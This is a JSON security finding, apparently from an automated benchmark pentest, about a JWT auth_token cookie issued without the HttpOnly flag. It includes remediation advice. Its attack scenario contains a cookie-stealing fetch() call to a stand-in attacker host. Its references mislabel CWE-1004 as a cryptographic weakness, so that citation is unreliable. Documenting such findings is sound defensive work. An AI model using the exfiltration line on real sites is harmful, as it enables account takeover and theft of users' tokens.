{
  "title": "Sensitive JWT Token (auth_token) Missing HttpOnly Flag - XSS Vulnerability",
  "severity": "HIGH",
  "description": "The authentication JWT token (auth_token) is issued without the HttpOnly flag, making it accessible to JavaScript code. While the session cookie has HttpOnly flag set correctly, the auth_token does not. This allows any reflected or stored XSS vulnerability in the application to steal the user's authentication token via document.cookie.\n\nThe vulnerability manifests as an asymmetric cookie security configuration:\n- auth_token: Issued WITHOUT HttpOnly flag (VULNERABLE)\n- session: Issued WITH HttpOnly flag (SECURE)\n\nThis inconsistency demonstrates improper cookie security configuration. Any JavaScript code executing in the user's browser context can access the auth_token through document.cookie, while the session cookie remains protected.",
  "impact": "If any XSS vulnerability exists in the application (reflected or stored), attackers can steal the auth_token via JavaScript (document.cookie), compromising user authentication and gaining unauthorized session access. The impact is compounded because:\n\n1. Authentication tokens are high-value targets for attackers\n2. XSS vulnerabilities are common web vulnerabilities\n3. Stolen JWT tokens can be used indefinitely (especially if tokens lack expiration, which is documented in another finding)\n4. Attacker gains full impersonation of the victim user\n5. Compromised account can be used to perform actions as the legitimate user\n\nThis vulnerability transforms XSS from a possible information disclosure into a critical authentication bypass.",
  "endpoint": "http://localhost:8000/login",
  "evidence": "Logged in with test:test credentials and captured HTTP 302 response from POST /login which contains Set-Cookie headers:\n\n1. auth_token=eyJ1c2VyX2lkIjoxMDAzMn0...; Path=/ (NO HttpOnly flag)\n2. session=...; HttpOnly; Path=/ (HAS HttpOnly flag)\n\nPOC execution output confirms:\n- auth_token cookie is MISSING HttpOnly flag\n- session cookie correctly HAS HttpOnly flag\n- This creates asymmetric security configuration\n- JavaScript can access auth_token via document.cookie\n- JavaScript CANNOT access session cookie (protected by HttpOnly)\n\nAttack scenario validated:\n1. Attacker injects JavaScript: document.cookie â†’ includes auth_token\n2. Malicious script: fetch('http://attacker.com?token='+document.cookie)\n3. auth_token transmitted to attacker server\n4. Attacker uses stolen token for authentication\n\nThe vulnerability allows bypassing same-origin policy protection that HttpOnly provides.",
  "pocPath": "pocs/poc_auth_token_missing_httponly_v2.sh",
  "remediation": "1. Add HttpOnly flag to auth_token cookie during issuance:\n   Set-Cookie: auth_token=<token_value>; HttpOnly; Secure; Path=/; SameSite=Strict\n\n2. Ensure consistent cookie security across all authentication-related cookies:\n   - Use HttpOnly on all sensitive cookies that should not be accessed by JavaScript\n   - Use Secure flag to ensure transmission only over HTTPS in production\n   - Use SameSite=Strict to prevent CSRF attacks\n\n3. Implement in application code (example for common frameworks):\n   - Django: SESSION_COOKIE_HTTPONLY = True, SESSION_COOKIE_SECURE = True\n   - Express.js: app.use(session({ cookie: { httpOnly: true, secure: true, sameSite: 'strict' } }))\n   - PHP: ini_set('session.cookie_httponly', 1); ini_set('session.cookie_secure', 1);\n\n4. Verify all Set-Cookie responses include HttpOnly flag through:\n   - Code review of cookie-setting logic\n   - Automated security testing/scanning\n   - Manual testing via browser developer tools\n\n5. Consider defense-in-depth:\n   - Implement Content Security Policy (CSP) to limit XSS impact\n   - Use token rotation and short expiration times\n   - Implement additional authentication factors",
  "references": "OWASP A03:2021 - Cross-Site Scripting (XSS), CWE-1004 - Use of a Broken or Risky Cryptographic Algorithm, CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting'), OWASP - HttpOnly Cookie Flag, RFC 6265 - HTTP State Management Mechanism (Cookies)",
  "toolCallDescription": "Documenting auth_token missing HttpOnly flag vulnerability with working POC evidence",
  "timestamp": "2025-11-04T14:49:29.155Z",
  "sessionId": "benchmark-XBEN-027-24-mhknopkv",
  "target": "./repo"
}